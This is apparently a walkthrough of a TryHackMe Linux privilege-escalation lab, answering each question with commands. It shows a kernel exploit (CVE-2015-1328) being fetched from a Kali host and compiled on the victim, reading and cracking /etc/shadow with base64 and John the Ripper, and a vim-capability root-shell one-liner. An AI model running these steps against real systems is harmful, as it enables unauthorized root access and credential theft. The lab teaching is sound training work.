# Linux Privilege Escalation

**Room Link:** [https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)

## Enumeration

**What is the hostname of the target system?**

**Victim**

```
hostname
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**What is the Linux kernel version of the target system?**

**Victim**

```
uname -a
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

**What Linux is this?**

**Victim**

```
cat /etc/issue
```

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

**What version of the Python language is installed on the system?**

**Victim**

```
python -V
```

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

**What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)**

CVE-2015-1328



## Privilege Escalation: Kernel Exploits

**Victim**

```
uname -a
```

<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wget https://www.exploit-db.com/raw/37292 -O 37292.c
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp
wget http://$KALI:81/37292.c
gcc 37292.c -o exploit
chmod +x exploit
./exploit
whoami
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation: Sudo

**How many programs can the user "karen" run on the target system with sudo rights?**

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**What is the content of the flag2.txt file?**

**Victim**

```
sudo find / -name "flag2.txt"
cat /home/ubuntu/flag2.txt
```

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

**How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?**

**Victim**

```
sudo nmap --interactive
```

**What is the hash of frank's password?**

**Victim**

```
sudo nano /etc/shadow
```

## Privilege Escalation: SUID

**Victim**

```
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>



**Which user shares the name of a great comic book writer?**

**Victim**

```
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**What is the password of user2?**

Since base64 was in the list we can read the contents of shadow and passwd with it. Once outputted save the results on Kali.

**Victim**

```
base64 /etc/shadow | base64 --decode
base64 /etc/passwd | base64 --decode
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Kali**

```
unshadow passwd shadow > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**What is the content of the flag3.txt file?**

**Victim**

```
find / -name "flag3.txt" 2>/dev/null
base64 /home/ubuntu/flag3.txt | base64 --decode
```

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation: Capabilities

**How many binaries have set capabilities?**

**Victim**

```
getcap -r / 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

****

****

**What is the content of the flag4.txt file?**

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>



```
find / -name "flag4.txt" 2>/dev/null
cat /home/ubuntu/flag4.txt
```





















